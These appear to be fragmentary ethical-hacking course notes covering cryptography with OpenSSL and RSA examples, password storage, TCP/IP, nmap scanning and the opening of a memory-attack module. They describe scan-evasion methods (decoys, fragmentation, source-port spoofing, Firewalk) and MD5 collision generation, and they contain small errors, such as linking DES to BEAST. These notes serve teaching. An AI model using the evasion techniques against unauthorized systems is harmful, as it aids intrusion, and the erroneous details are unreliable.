- Bragging rights

#### Ability
- Point-and-click tools
- Google anything
- Dark Web marketplaces
- Online anonymity

#### Opportunity
- Heavy dependence on IT
- Insecure software
- Humans are weakest link
- Everything is interconnected

### Threat Actors

| Actor | Motivation | Example |
|-------|------------|---------|

### Security Goals: The CIA Triad

#### Confidentiality
- Protect sensitive information from unauthorized disclosure
- **Techniques**: Encryption, access controls, data masking
- **Coverage**: Data at rest, in transit, and in use

#### Integrity
- Ensure information hasn't been tampered with or modified unauthorized
- **Techniques**: Digital signatures, message authentication codes, data hashing
- **Protection**: Against unauthorized modification, deletion, or addition

#### Availability
- Ensure information and systems are accessible to authorized users when needed
- **Techniques**: Load balancing, redundancy, disaster recovery planning
- **Protection**: Against denial of service attacks, system failures

### Common Cybersecurity Terms

- **Asset**: Data, services, hardware/software/firmware, processing power, bandwidth
- **Risk**: Measure of extent an entity is threatened by potential circumstances
- **Attack**: Malicious activity attempting to collect, disrupt, deny, degrade, or destroy information system resources
- **Threat**: Potential for violation of security (malware infections, data breaches, DoS attacks)
- **Vulnerabilities**: Flaws or weaknesses in system design, implementation, or operation that could be exploited

### Asymmetric Forces (Why Bad Guys Are Winning)

| Factor | Good Guys | Bad Guys |
|--------|-----------|----------|
| **Time** | Limited (day job) | Unconstrained |
| **Money** | Limited budget | Nation states/crime groups can provide $$ |
| **Laws** | Must abide by laws | Happy to break any laws |
| **Success Factor** | Must prevent ALL incidents ALL the time | Only need to find ONE weakness |

### Hacker Hat Colors

- **Black Hat**: Criminals engaging in illegal activities for personal gain
- **White Hat**: "Ethical" hackers staying within legal limits to fight cybercrime
- **Grey Hat**: Somewhere between - may break laws but not with malicious intent

### Current Cybersecurity Trends

#### Security is Getting Better
- Better defaults in software
- Vendors focused on security (bug bounties, security teams)

# 0x02 Cryptography

## 1. Terminology and Fundamentals

### Key Definitions
- **Cryptography**: Practical (engineering) development and study of encryption systems
- **Cryptology**: Academic (mathematical) study of encryption and their properties  
- **Cryptanalysis**: Analyzing and breaking cryptographic systems
- **Cipher**: Algorithm or process used to encrypt/decrypt
- **Plaintext**: Original unencrypted message
- **Ciphertext**: Encrypted message
- **Key**: Secret cipher setting known only to sender and receiver

### Goals of Cryptography (CIA + Non-Repudiation)
1. **Confidentiality**: Only authorized people see the data
2. **Integrity**: Assurance data hasn't been manipulated/corrupted
3. **Authenticity**: Assurance we know who sent/created the data
4. **Non-Repudiation**: Assurance author/sender cannot deny an action

> **Note**: Availability is NOT a goal of cryptography

---

## 2. Symmetric Encryption

### Concept
- Same key used for both encryption and decryption
- Formula: `E(M, K) → C` and `D(C, K) → M`
- Both parties must securely share the pre-shared key

### Historical Ciphers

#### Caesar Cipher (Shift Cipher)
```
E(M, n) → shift each character by n (1≤ n ≤ 25)
D(C, n) → shift each character by 26-n
Attack: Brute force (try n=1,2,...25)
```

#### Vigenère Cipher
```
K=ADEL (0,3,4,11)
Shift 1st char by K1, 2nd by K2, etc.
Attack: Frequency analysis
```

#### Substitution Cipher
```
Map A→Z to random permutation
Key space: 26! = 4×10^26
Attack: Frequency analysis
```

#### Transposition Cipher
- Creates anagram by column transposition
- Key dictates number of columns and ordering

### Kerckhoffs's Principle
1. Encryption scheme should be open (don't rely on security by obscurity)
2. Only the secret key should be kept secret  
3. Should be easy to change keys (in case of compromise)

**Shannon's Maxim**: Don't rely on security through obscurity

---

## 3. XOR and Digital Encryption

### XOR Properties
```
A ⊕ {0} = A
A ⊕ {1} = ~A  
A ⊕ A = {0}
A ⊕ B = B ⊕ A
A ⊕ (B ⊕ C) = (A ⊕ B) ⊕ C

Encryption: M ⊕ K = C
Decryption: C ⊕ K = M
```

### One-Time Pad
- **Mathematically proven PERFECT secrecy**
- Requirements:
  - Key must be completely random
  - Key must be as long as plaintext
  - Can only be used ONCE
  - Safe key exchange defeats the purpose
- **NOT PRACTICAL**

### N-Time Pad Problem
If attacker has multiple ciphertexts encrypted with same key:
```
C1 ⊕ C2 = (M1 ⊕ K) ⊕ (M2 ⊕ K) = (M1 ⊕ M2)
```
Can deduce locations of spaces, then work out M1, M2, and K

---

## 4. Block vs Stream Ciphers

### Block Cipher
- Encrypts data in blocks of predetermined size
- Different modes of operation:
  - **ECB (Electronic Code Book)**: Simple, parallel processing, but identical blocks → identical ciphertext
  - **CBC (Cipher Block Chaining)**: Uses IV, spreads information across blocks, serial processing
  - **CTR (Counter Mode)**: Uses NONCE + counter, parallel processing

### Stream Cipher
- Encrypts data one bit at a time
- Faster, less resources than block ciphers
- Not as strong as block ciphers

### ECB vs CBC Comparison
- **ECB**: Can see patterns in encrypted images (security weakness)
- **CBC**: Produces pseudo-random appearance (more secure)

---

## 5. Common Symmetric Ciphers

### Block Ciphers
- **DES**: 56-bit key (deprecated, vulnerable to BEAST attack)
- **3DES**: Triple DES with 168/112/56-bit keys
- **AES**: Current standard, key sizes 128/192/256 bits

### Stream Ciphers
- **RC4**: Used in wireless networks
- **A5**: Used in mobile networks

---

## 6. Diffie-Hellman Key Exchange

### Process
```
1. Agree on large prime p and generator g (1 < g < p-1)
2. Alice chooses secret a, Bob chooses secret b
3. Alice sends A = g^a mod p, Bob sends B = g^b mod p
4. Alice computes K = B^a mod p = g^(ab) mod p
5. Bob computes K = A^b mod p = g^(ab) mod p
```

### Security
- **Easy**: a ⇒ g^a mod p = A
- **Hard**: A ⇒ a (discrete logarithm problem)
- Eve knows p, g, A, B but cannot derive a or b

### Color Analogy
Common paint + secret colors = public transport colors
Mix with other's public color + own secret = same final color

### **Diffie-Hellman MITM Attack (Mallory's Attack)**
**Scenario**: Mallory intercepts communication between Alice and Bob

**Attack Steps**:
1. **Alice wants to establish shared key with Bob**
2. **Mallory intercepts Alice's public value A = g^a mod p**
3. **Mallory generates her own secret m, sends M = g^m mod p to Bob**
4. **Bob receives M (thinking it's from Alice), sends B = g^b mod p**
5. **Mallory intercepts B, sends her own M' = g^m' mod p to Alice**
6. **Result**: 
   - Alice and Mallory share key K₁ = g^(am) mod p
   - Bob and Mallory share key K₂ = g^(bm') mod p
   - Mallory can decrypt all communication from both parties

**Defense**: Authentication (certificates, pre-shared secrets) to verify identity

---

## 7. Asymmetric Encryption (RSA)

### Concept
- Different keys for encryption and decryption
- **Public Key**: Known to everyone, used for encryption
- **Private Key**: Kept secret, used for decryption

### RSA Mathematics
```
1. Choose large primes p and q
2. Calculate n = p × q (modulus)
3. Calculate φ(n) = (p-1)(q-1)
4. Choose e (commonly 65537)
5. Calculate d such that (d × e) mod φ(n) = 1

Public key: (n, e)
Private key: (n, d)

Encryption: C = M^e mod n
Decryption: M = C^d mod n
```

### RSA Security
- Based on difficulty of factoring large numbers
- Easy: n = p × q
- Hard: n → p and q (factorization problem)

### RSA Digital Signature
- Encrypt with private key, decrypt with public key
- Only Alice can create signature S = E(M, K_priv)
- Anyone can verify M = D(S, K_pub)

---

## 8. Cryptographic Hash Functions

### Properties
1. **One-way function**: Cannot reverse hash to get original
2. **Fixed-length output**: Regardless of input size
3. **Deterministic**: Same input always produces same hash
4. **Avalanche effect**: Small input change drastically changes output
5. **Collision-resistant**: Hard to find two inputs with same hash

### Common Hash Functions
- **MD5**: 128-bit, broken (collisions found in 2004)
- **SHA-1**: 160-bit, deprecated
- **SHA-256/SHA-512**: Current standards

### MD5 Collision Example
Multiple different images can have identical MD5 hashes, demonstrating the vulnerability.

---

## 9. Digital Signatures

### Process
```
1. Calculate hash of document: H(M)
2. Encrypt hash with private key: S = E(H(M), K_priv)
3. Send document + signature: (M, S)
4. Recipient decrypts signature: H(M) = D(S, K_pub)
5. Recipient calculates hash of received document
6. Compare hashes - if match, signature is valid
```

### Benefits
- **Integrity**: Document hasn't been tampered with
- **Authenticity**: Confirms sender identity
- **Non-repudiation**: Sender cannot deny signing

---

## 10. Certificate Authority (CA)

### Problem: Trust
How do you trust a public key advertised by someone? Man-in-the-middle attacks possible.

### Solution: Certificate Authority
- Trusted third party (Comodo, Symantec, GoDaddy)
- Issues digital certificates containing:
  - Subject's public key
  - CA's digital signature of that public key
- Browser verifies certificate by checking CA's signature

---

## 11. TLS/HTTPS Implementation

### TLS Handshake Process
```
1. Client Hello: Initiate TLS connection
2. Server Certificate: Contains server's public key (CA-signed)
3. Certificate Verification: Client verifies CA signature  
4. Key Exchange: Exchange session key (encrypted with server's public key)
5. Encrypted Communication: Use session key for symmetric encryption
```

### Cipher Suite Format
`Key Exchange + Authentication + Block Cipher + Message Digest`

Example: `ECDHE-RSA-AES256-GCM-SHA384`
- **ECDHE**: Elliptic Curve Diffie-Hellman Ephemeral
- **RSA**: Authentication method
- **AES256-GCM**: Symmetric encryption with authentication
- **SHA384**: Hash function

---

## 12. Password Security

### Password Storage Evolution

#### Bad: Plaintext Storage
Never store passwords in plaintext - immediate compromise if breached.

#### Better: Simple Hashing
```
User: Alice
Password Hash: SHA256(password)
```
**Problems**: 
- Same passwords = same hashes
- Vulnerable to rainbow table attacks

#### Best: Salted + Stretched Hashing
```
User: Alice
Salt: 001101011 (random per user)
Hash: bcrypt(salt + password, cost_factor)
```

### Rainbow Table Attacks
- Precomputed tables of {password, hash} pairs
- Example: SHA1 hashes for all 8-character passwords = 127GB
- **Defense**: Salting makes precomputation infeasible

### Salting Benefits
- **Different salts** → same passwords produce different hashes
- **Makes rainbow tables impractical** (need table for each salt)
- **Doesn't prevent brute force** on individual passwords
- **Salt can be stored in plaintext**

### Key Stretching (Slow Hashing)
**Algorithms**: bcrypt, Argon2, scrypt, PBKDF2

**Process**: Hash the hash multiple times
```
H(H(H(H(...H(salt + password)...))))
```

**Benefits**:
- Makes brute force attacks computationally expensive
- Example: ~100 guesses/sec with bcrypt vs 1 billion/sec with SHA1
- Adjust cost factor to take ~1 second per verification

### Modern Linux Example (/etc/shadow)
```
$6$salt$hash
^^ ^^   ^^^^
|  |    Hash value
|  8-character salt  
SHA-512 indicator
```

---

## 13. OpenSSL Workshop Commands

### Symmetric Encryption
```bash
# Create plaintext file
echo "Ethical Hacking is Fun" > plaintext

# Encrypt with AES-128-CBC
openssl enc -aes-128-cbc -in plaintext -out ciphertext -k 123 -iv 456

# Decrypt 
openssl enc -d -aes-128-cbc -in ciphertext -k 123 -iv 456

# View in hex editor

```

### ECB vs CBC Demonstration

# Encrypt image with ECB (shows patterns)
openssl enc -aes-128-ecb -in image.bmp -out encrypted_ecb.bmp -K 123

# Encrypt image with CBC (looks random)  
openssl enc -aes-128-cbc -in image.bmp -out encrypted_cbc.bmp -K 123 -iv 456

# Copy bitmap header for viewing
dd if=original.bmp count=54 ibs=1 >> output.bmp
dd if=encrypted.bmp skip=54 ibs=1 >> output.bmp
```

### RSA Key Generation and Encryption
```bash
# Generate 512-bit RSA private key
openssl genrsa 512 > private.key

# Extract public key
openssl rsa -pubout < private.key > public.key

# View key details
openssl rsa -text -pubin < public.key

# Encrypt message
echo "Ethical hacking is fun" | openssl pkeyutl -encrypt -pubin -inkey public.key > message.dat

# Decrypt message
openssl pkeyutl -decrypt -inkey private.key -in message.dat
```

### Textbook RSA Implementation
```python
def invmod(a,n):
    i=1
    while True:
        c = n * i + 1
        if(c%a==0):
            c = c//a
            break
        i = i+1
    return c

p = int("E017",16)  # first prime
q = int("D20D",16)  # second prime  
e = int("010001",16)  # public exponent

n = p*q  # modulus
d = invmod(e, (p-1)*(q-1))  # private exponent

# Encrypt
msg = 12345
enc = pow(msg, e, n)

# Decrypt  
plain = pow(enc, d, n)
```

### Cryptographic Hashing
```bash
# Calculate SHA256 hash
openssl dgst -sha256 file.txt

# Different algorithms
openssl dgst -md5 file.txt
openssl dgst -sha1 file.txt
```

### Digital Signatures
```bash
# Generate signing key and certificate
openssl req -nodes -x509 -sha256 -newkey rsa:2048 -keyout signing.key -out signing.crt

# Create message
echo "Ethical hacking is cool" > message.txt

# Sign message
openssl dgst -sha256 -sign signing.key -out signature.txt.sha256 message.txt

# Extract public key from certificate
openssl x509 -in signing.crt -pubkey -noout > signing.pub.key

# Verify signature
openssl dgst -sha256 -verify signing.pub.key -signature signature.txt.sha256 message.txt
```

### Certificate Verification
```bash
# Download certificate from server
openssl s_client -connect www.spotify.com:443 -showcerts

# Verify certificate chain
openssl verify -verbose -CAfile root_ca.crt server.crt
```

### Password Hashing
```bash
# Create SHA512 password hash with salt
openssl passwd -6 -salt randomsalt password

# Example output format:
# $6$randomsalt$hashedpassword
```

## 14. Key Security Considerations

### Key Length Recommendations
- **Symmetric Keys**: AES-256 (256 bits)
- **Asymmetric Keys**: RSA-2048 or higher (2048+ bits)  
- **Hash Functions**: SHA-256 or SHA-512

### Common Vulnerabilities
1. **Weak key generation**: Insufficient randomness
2. **Key reuse**: Using same key multiple times inappropriately
3. **Poor key storage**: Storing keys insecurely
4. **Deprecated algorithms**: Using broken ciphers (MD5, DES)
5. **Implementation flaws**: Side-channel attacks, timing attacks

### Best Practices
1. **Use established libraries**: Don't implement your own crypto
2. **Keep keys secret**: Only the intended parties should have access
3. **Regular key rotation**: Change keys periodically
4. **Use appropriate key lengths**: Follow current security standards
5. **Secure key exchange**: Use proper protocols (DH, RSA)

---

## 15. Attack Methods and Tools

### Password Attack Tools
- **Offline Cracking**: John the Ripper, Hashcat
- **Online Cracking**: THC Hydra, Brutus  
- **Dictionary Building**: Cewl
- **Rainbow Tables**: Pre-computed hash tables

### Cryptanalysis Techniques
1. **Brute Force**: Try all possible keys
2. **Frequency Analysis**: Exploit letter frequency patterns
3. **Known Plaintext**: Use known plaintext-ciphertext pairs
4. **Chosen Plaintext**: Attacker can choose plaintexts to encrypt
5. **Side-Channel**: Exploit timing, power consumption, etc.

### MD5 Collision Generation
```bash
# Using fastcoll tool
echo "This is a test prefix" > prefix.txt
./fastcoll prefix.txt

# Results in two files with identical MD5 but different content
md5sum md5_data1 md5_data2
# Both show same hash: 926459c620ba6651ba0ce6d223ca4e25
```

## 16. Exam Tips and Key Concepts

### Critical Formulas to Remember
```
Symmetric: E(M,K) → C, D(C,K) → M
Asymmetric: E(M,Kpub) → C, D(C,Kpriv) → M  
Digital Signature: S = E(H(M), Kpriv), M = D(S, Kpub)
XOR: M ⊕ K = C, C ⊕ K = M
DH Key Exchange: K = g^(ab) mod p
RSA: C = M^e mod n, M = C^d mod n
```

### Security Principles
1. **Kerckhoffs's Principle**: Security should not depend on secrecy of algorithm
2. **Defense in Depth**: Use multiple security layers
3. **Least Privilege**: Give minimum necessary access
4. **Fail Securely**: System should fail to secure state

### Common Exam Questions
- Compare symmetric vs asymmetric encryption
- Explain how digital signatures provide non-repudiation
- Describe the TLS handshake process
- Calculate simple RSA encryption/decryption
- Identify vulnerabilities in password storage methods
- Explain why ECB mode is insecure
- Describe how salting prevents rainbow table attacks

### Practical Scenarios
- Setting up secure communication between two parties
- Implementing password storage system
- Verifying digital signatures
- Analyzing cipher modes for different use cases
- Identifying appropriate key lengths for security requirements

Remember: **Cryptography is difficult to implement correctly - always use well-tested libraries and established standards rather than creating your own implementations.**

## Introduction to Security Assessment

### Core Security Principles - C.I.A. Triad

**Cybersecurity protects three fundamental principles:**

- **Confidentiality**: Controlling access to data/systems
- **Integrity**: Preventing tampering with data/systems  
- **Availability**: Ensuring access to data/systems

### Common Attack Vectors

**TARGET: Systems**
- **Malware**: RAT (Remote Access Trojan)
- **Web Application Attacks**: SQL Injection (SQLi), Cross-Site Scripting (XSS)
- **Remote Code Execution (RCE)**: Buffer overflow, file upload vulnerabilities
- **Configuration Weaknesses**: Default passwords (e.g., Password = cisco), unprotected admin pages

**TARGET: Humans**
- **Social Engineering**
- **Phishing**

### Security Testing Goal

> **Primary Objective**: Find weaknesses (vulnerabilities) in applications and infrastructure and fix them before malicious actors exploit them.

### What is a Vulnerability?

> "A weakness in software, hardware or an organisation process that can be exploited by an attacker to compromise the C.I.A. of a system or its data"

**Types of Vulnerabilities:**
- **Software flaw (bug)**: Design errors, implementation errors
- **Misconfiguration**: Improper system setup

# 0x04 Networks and Scanning

## Overview and Objectives

Network scanning is the active phase following reconnaissance and OSINT in ethical hacking. This phase involves:
- Identifying running hosts, services, OS and application versions
- Discovering known vulnerabilities
- **Important**: Requires explicit authorization from target organization

## Fundamental Networking Concepts

### OSI 5-Layer Model

| Layer | Name | Protocol | Data Unit | Addressing | Responsibility |
|-------|------|----------|-----------|------------|----------------|
| 5 | Application | HTTP, SMTP, etc. | Messages | - | How applications communicate (e.g., HTTP for web) |
| 4 | Transport | TCP/UDP | Segment | Port # | Connection to specific services, reliable communication |
| 3 | Network | IP | Datagram | IP Address | Packet forwarding to final destination |
| 2 | Data Link | Ethernet, WiFi | Frames | MAC Address | Transmission between two connected nodes |
| 1 | Physical | 10 Base T, 802.11 | Bits | N/A | Translation to electrical/optical/radio signals |

### Protocol Layering Principles
- **Lower layers** provide services to layers above (don't care what higher layers do)
- **Higher layers** use services of layers below (don't worry about implementation)
- **Abstraction boundaries** separate layer responsibilities

### Packet Encapsulation
Data flows down the stack, with each layer adding its header:
```
Application Data → TCP Header + Data → IP Header + TCP Header + Data → Frame Header + IP Header + TCP Header + Data + Frame Footer
```

## Network Layer Protocols

### Internet Protocol (IP)
- Every host has a unique **IP address** (32-bit IPv4: xxx.xxx.xxx.xxx format)
- Every packet has an IP header indicating **source and destination**
- Routers forward packets toward destination based on routing tables
- **Best-effort delivery** (no guarantees)

#### IPv4 Header Key Fields
- **Version**: IP version (4)
- **TTL (Time To Live)**: Hop limit before packet discarded
- **Protocol**: Next layer protocol (TCP=6, UDP=17, ICMP=1)
- **Source/Destination Address**: 32-bit IP addresses
- **Total Length**: Packet size including header

### Address Resolution Protocol (ARP)
- Maps **IP addresses to MAC addresses** on local network
- Process:
  1. Host broadcasts "Who has IP address X?"
  2. Host with IP X replies "IP X is at MAC address Y"
- Critical for local network communication

### Dynamic Host Configuration Protocol (DHCP)
- **Automatically assigns IP configuration** to hosts
- Benefits:
  - On-demand IP assignment
  - Avoids manual configuration
  - Supports device mobility
- Provides: IP address, subnet mask, default gateway, DNS servers

### Domain Name System (DNS)
- **Hierarchical, delegatable namespace** (root → TLD → domain → subdomain → host)
- Resolves human-readable names to IP addresses
- **DNS Query Process**:
  1. Local DNS server queries root servers
  2. Root directs to TLD servers (.com, .edu, etc.)
  3. TLD directs to authoritative domain servers
  4. Domain server returns IP address

#### DNS Record Types
- **A**: Maps hostname to IPv4 address
- **NS**: Specifies authoritative name servers
- **MX**: Mail exchange servers
- **CNAME**: Canonical name (alias)

## Transport Layer Protocols

### User Datagram Protocol (UDP)
**Characteristics:**
- **Connectionless** (no handshake)
- **Unreliable** (no error recovery)
- **Fast/Low latency**
- **Short header** (8 bytes)

**Applications:**
- DNS queries
- DHCP
- Live streaming
- VoIP (where speed > reliability)

### Transmission Control Protocol (TCP)
**Characteristics:**
- **Connection-oriented** (3-way handshake)
- **Reliable** (error detection/correction)
- **Slower** (due to overhead)
- **Complex header** (20+ bytes)

**Key Functions:**
- **Reliability**: Sequence numbers, acknowledgments, retransmission
- **Multiplexing**: Port numbers identify applications
- **Segmentation**: Breaks large data into manageable segments
- **Flow Control**: Sliding window prevents receiver overflow
- **Error Detection**: Checksums detect corruption

#### TCP Header Control Flags
- **SYN**: Synchronize (connection establishment)
- **ACK**: Acknowledgment
- **FIN**: Finish (connection termination)
- **RST**: Reset (abort connection)
- **PSH**: Push (immediate delivery)
- **URG**: Urgent data

#### TCP Three-Way Handshake
```
Client                    Server
  |                        |
  |----[SYN seq=100]------>|  (State: SYN-SENT → SYN-RECEIVED)
  |                        |
  |<-[SYN-ACK seq=200------|  (State: SYN-RECEIVED → ESTABLISHED)
  |    ack=101]            |
  |                        |
  |----[ACK seq=101------->|  (State: ESTABLISHED)
  |    ack=201]            |
```

#### TCP Connection Termination
- Either side sends **FIN** packet
- Receiver acknowledges with **ACK**
- Eventually other side sends **FIN**
- Final **ACK** completes termination

#### TCP Connection Reset
- **RST packet** immediately terminates connection
- Sent when receiving invalid packets for connection state
- Used to abort connections cleanly

### Port Numbers
- **Range**: 1-65535 (16-bit)
- **Well-known ports** (1-1023): Reserved for system services
- **Registered ports** (1024-49151): Assigned to applications
- **Dynamic/Private ports** (49152-65535): Temporary use

#### Common Port Numbers
| Port | Service | Protocol |
|------|---------|----------|
| 22 | SSH | TCP |
| 23 | Telnet | TCP |
| 25 | SMTP | TCP |
| 53 | DNS | UDP/TCP |
| 67/68 | DHCP | UDP |
| 80 | HTTP | TCP |
| 443 | HTTPS | TCP |

## Internet Control Message Protocol (ICMP)

### Purpose
- **Helper protocol** for IP
- **Error reporting** (unreachable destinations, TTL exceeded)
- **Network diagnostics** (ping, traceroute)

### Key ICMP Message Types
- **Type 0**: Echo Reply (ping response)
- **Type 8**: Echo Request (ping)
- **Type 11**: Time Exceeded (TTL=0)
- **Type 3**: Destination Unreachable

### ICMP Applications
- **Ping**: Tests host reachability
- **Traceroute**: Maps network path using TTL manipulation

## Network Scanning Fundamentals

### Scanning Overview
**Network scanning** is an intense, methodical process to uncover:
- IP addresses of live systems
- Operating system versions
- MAC addresses
- Service information and versions
- Open ports
- Network topology
- Firewall configuration

### Host Discovery Methods

#### Ping Sweeps
- Send **ICMP Echo Requests** to IP ranges
- Identify responding (live) hosts
- **Limitation**: Many networks filter ICMP

#### TCP SYN Sweeps
- Send **TCP SYN packets** to common ports
- **SYN-ACK response** indicates open port/live host
- More reliable than ICMP in filtered environments

## Port Scanning Techniques

### TCP Full Connect Scan (`nmap -sT`)
**Process:**
1. Complete 3-way handshake
2. Immediately close connection
3. **Open port**: Handshake completes
4. **Closed port**: Connection refused

**Advantages:**
- Most accurate results
- Works through any TCP stack

**Disadvantages:**
- Easily logged by target
- Slower due to full connection overhead

### TCP SYN Scan / Half-Open Scan (`nmap -sS`)
**Process:**
1. Send SYN packet
2. Receive SYN-ACK (open) or RST (closed)
3. Send RST to abort (don't complete handshake)

**Advantages:**
- **Stealthy**: Less likely to be logged
- **Faster**: No full connection overhead
- **Default nmap scan**

**Disadvantages:**
- Requires raw socket access (root privileges)

### Stealth Scanning Techniques

#### FIN Scan (`nmap -sF`)
- Send packet with **FIN flag only**
- **Closed port**: Should respond with RST
- **Open port**: No response (RFC 793 compliance)
- **Limitation**: Many modern systems don't follow RFC strictly

#### NULL Scan (`nmap -sN`)
- Send packet with **no flags set**
- Same response logic as FIN scan
- Useful for firewall evasion

#### XMAS Scan (`nmap -sX`)
- Send packet with **FIN, PSH, URG flags set** (like Christmas tree lights)
- **Illegal flag combination** per RFC 793
- **Closed port**: Should respond with RST
- **Open port**: No response
- **Limitation**: Ineffective against modern TCP stacks

### UDP Scanning (`nmap -sU`)
- Send UDP packets to target ports
- **Open port**: Application response or no response
- **Closed port**: ICMP Port Unreachable
- **Challenges**: Slower, rate-limited, less reliable

## Advanced Scanning Techniques

### OS Fingerprinting (`nmap -O`)
- Analyzes **TCP/IP stack characteristics**:
  - Initial sequence number patterns
  - TCP options usage
  - Response to unusual packets
  - Window size behaviors
- Creates **signature matching** known OS implementations

### Service Version Detection (`nmap -sV` or `-A`)
- **Banner grabbing**: Capture service responses
- **Probe techniques**: Send application-specific requests
- **Signature matching**: Compare responses to known patterns

### Firewall Evasion Techniques

#### Fragmentation
- Split packets into fragments
- May bypass simple packet filters
- `nmap -f` (fragmentation)

#### Decoy Scanning
- **Spoofed source addresses** hide real attacker
- `nmap -D decoy1,decoy2,ME,decoy3 target`
- Target sees multiple scan sources

#### Timing Templates (`nmap -T0` through `-T5`)
- **T0 (Paranoid)**: Ultra-slow, IDS evasion
- **T1 (Sneaky)**: Slow, avoid detection
- **T2 (Polite)**: Slow, reduce bandwidth usage
- **T3 (Normal)**: Default timing
- **T4 (Aggressive)**: Fast, assume good network
- **T5 (Insane)**: Very fast, may miss results

#### Source Port Manipulation
- Use **common source ports** (53, 80, 443)
- May bypass poorly configured firewalls
- `nmap --source-port 53 target`

### Firewalk Technique
**Purpose**: Determine firewall rules without targeting end hosts

**Process:**
1. **Discover firewall distance** using traceroute
2. **Send packets with TTL = distance + 1**
3. **Monitor ICMP responses**:
   - **Time Exceeded**: Packet passed firewall
   - **No response**: Packet blocked by firewall

## Network Topology Discovery

### Traceroute Mechanism
**Process:**
1. Send packets with **incrementing TTL values**
2. Each router decrements TTL
3. When **TTL reaches 0**, router sends **ICMP Time Exceeded**
4. Map intermediate routers to destination

**Variations:**
- **ICMP traceroute**: Uses ICMP echo requests
- **UDP traceroute**: Uses UDP to random high ports  
- **TCP traceroute**: Uses TCP SYN packets

**Limitations:**
- Many networks **filter ICMP**
- **Load balancing** can show multiple paths
- **Rate limiting** affects accuracy

## Mass Scanning Considerations

### Modern Scanning Tools
- **Nmap**: Feature-rich, slower for large ranges
- **Masscan**: High-speed, Internet-scale scanning
- **Zmap**: Academic research tool, very fast
- **Unicornscan**: Asynchronous scanning

### Performance Optimization
- **Rate limiting**: `--min-rate`, `--max-rate`
- **Parallel scanning**: Multiple target threads
- **Timing optimization**: Balance speed vs. accuracy
- **Target selection**: Focus on likely active ranges

### Ethical and Legal Considerations
- **Explicit authorization required** for all scanning
- **Bug bounty programs**: Read terms carefully
- **Rate limiting**: Avoid overwhelming targets
- **Logging awareness**: Scanning activities are typically logged
- **Network impact**: Consider bandwidth usage

## Nmap Command Reference

### Basic Syntax
```bash
nmap [Scan Type] [Options] {target specification}
```

nmap -Pn target            # Skip ping (assume host up)
nmap -n target             # No DNS resolution
```

## Post-Scanning Analysis

### Information Gathered
After successful scanning, attackers typically have:
- **Live host inventory**: Active IP addresses
- **Port/service mapping**: Open ports and running services
- **OS fingerprints**: Operating system types and versions
- **Application versions**: Service software and patch levels
- **Network topology**: Router paths and network structure
- **Firewall rules**: Filtering policies and bypass opportunities

### Next Steps in Attack Chain
1. **Vulnerability Assessment**: Match discovered services to known vulnerabilities
2. **Service Enumeration**: Deep dive into discovered services
3. **Credential Testing**: Attempt default/weak authentication
4. **Exploitation**: Leverage vulnerabilities for system access

## Defense Against Scanning

### Detection Methods
- **Network monitoring**: IDS/IPS systems
- **Log analysis**: Unusual connection patterns
- **Rate limiting**: Detect high-frequency requests
- **Honeypots**: Detect unauthorized scanning

### Defensive Measures
- **Firewall policies**: Block unnecessary ports/services
- **Service hardening**: Disable unused services
- **Rate limiting**: Slow down potential scanners
- **Network segmentation**: Limit scan propagation
- **Regular patching**: Close known vulnerabilities
- **Monitoring**: Real-time scan detection and response

## Summary

Network scanning is a critical phase in both offensive security testing and defensive security assessment. Understanding the underlying network protocols (TCP/IP, UDP, ICMP) and scanning techniques enables cybersecurity professionals to:

1. **Conduct authorized security assessments** effectively
2. **Detect and respond to unauthorized scanning** attempts
3. **Implement appropriate defensive countermeasures**
4. **Understand attacker reconnaissance methods**

The key to effective scanning is balancing **thoroughness with stealth**, **speed with accuracy**, and always ensuring **proper authorization** before conducting any scanning activities.

# 0x05 Memory Attacks & Control Hijacking

**Key Learning Objectives:**
- Types of control hijacking attacks (mostly memory attacks)
- Understand Linux memory layout on i386 32-bit
- How stack is used to manage function calls
- How buffer overflow and shellcode works
- Format string vulnerabilities
- Integer overflow attacks

---

## 1. Control Hijacking Attacks

### Definition
Control hijacking attacks take over a target machine (e.g., web server) by altering the control flow of a legitimate process to execute arbitrary code on the target.

### Common Types of Memory Attacks:
- **Buffer overflow and integer overflow attacks**
- **Format string vulnerabilities** 
- **Use after free**

### Key Characteristics:
- Runs as the privilege of the exploited process
- Occurs most commonly in **C and C++ programs**
- Other languages (Rust, Java, Python, etc.) have better memory management/protection

> **Analogy:** Coding in C/C++/Assembly is like driving a manual transmission car – you have more freedom and power, but more things can go wrong.

---

## 2. Computer Architecture (x86 - 32 bit)

### Von Neumann Architecture
- **Stored Program Computer** concept
- CPU contains Control Unit and Logic Unit
- Memory stores both data and instructions

### Code Execution Flow
1. **Native Compiled Languages** (C/C++) → Compiler → Machine Code
2. **Bytecode Languages** (.Net, Java) → Compiler → CIL/Bytecode → Machine Code
3. **Interpreted Languages** (Python, Ruby) → Interpreter → Machine Code

**Key Point:** At the machine code level, it's all the same to the CPU.

### Process Memory Layout

```
Higher Addresses (0xFFFFFFFF)
┌─────────────────────┐
│       STACK         │ ← Grows downwards
├─────────────────────┤
│                     │
│    (Free Space)     │
│                     │
├─────────────────────┤
│       HEAP          │ ← Grows upwards
├─────────────────────┤
│        BSS          │ ← Uninstantiated global
├─────────────────────┤
│       DATA          │ ← Instantiated global/static
├─────────────────────┤
│   CODE (PROGRAM)    │ ← Executable instructions
└─────────────────────┘
Lower Addresses (0x00000000)
```

### x86 Special Registers

- **EIP (Extended Instruction Pointer)** - Points to the current instruction
- **ESP (Extended Stack Pointer)** - Points to the "bottom" of stack
- **EBP (Extended Base Pointer)** - Points 4 bytes below the return pointer, used for referencing address of the previous frame

---

## 3. Stack Management & Function Calls

### Stack Frame Structure

```
┌─────────────────────┐
│    Arguments        │
├─────────────────────┤
│  Return Address     │ ← RIP (Return Instruction Pointer)
├─────────────────────┤
│ Saved Frame Pointer │ ← SFP (Saved Frame Pointer)
├─────────────────────┤
│  Local Variables    │
└─────────────────────┘
```

### Function Call Process

1. **Arguments**: Push function arguments onto stack
2. **Save EIP**: Push current EIP (return address) onto stack
3. **Save EBP**: Push current EBP (frame pointer) onto stack  
4. **Adjust Registers**: Update EBP, ESP, and EIP for new frame
5. **Execute Function**: Run function code with local variables
6. **Restore**: Restore EBP, ESP, EIP to previous values when returning

### Key Points:
- Stack grows from higher to lower addresses
- EBP points to top of current stack frame
- ESP points to bottom of current stack frame
- Return address (RIP) is critical for control flow

---

## 4. Buffer Overflow Attacks

### What is a Buffer?
Any allocated space in memory where data (often user input) is stored. Can be in stack or heap.

### The Problem with C
- **C has no concept of array length** - it just sees a sequence of bytes
- **No bounds checking** - `char buff[3]; buff[5] = '0';` is technically valid C code
